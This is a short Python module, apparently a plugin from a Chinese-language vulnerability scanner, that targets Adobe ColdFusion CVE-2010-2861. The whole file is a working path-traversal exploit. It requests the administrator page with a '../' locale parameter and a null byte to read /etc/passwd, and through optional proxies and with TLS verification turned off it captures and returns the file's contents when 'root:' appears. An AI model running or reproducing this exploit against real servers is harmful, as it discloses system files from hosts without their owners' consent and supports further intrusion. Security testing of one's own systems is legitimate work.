import requests
import time
from bs4 import BeautifulSoup
import logging

cdd=''
http = ''
https = ''
def dl14(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        aa = requests.get(url1+'CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en',cookies=s_cookie,proxies=proxies,verify=False,timeout=5)
        aa.encoding = 'utf-8'
        cd = BeautifulSoup(aa.text, 'html.parser')
        if 'root:' in cd.text:
            cdd = cd.text
        else:
            cdd = '[-]漏洞不存在'
    except Exception as aaa:
        cdd='请求错误\n'+str(aaa)
def sj4():
    global cdd
    return '--------------------------------------------------\n[ Adobe ColdFusion 文件读取漏洞（CVE-2010-2861） ]\n\n'+ str (cdd)+'\n'
def s4(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)
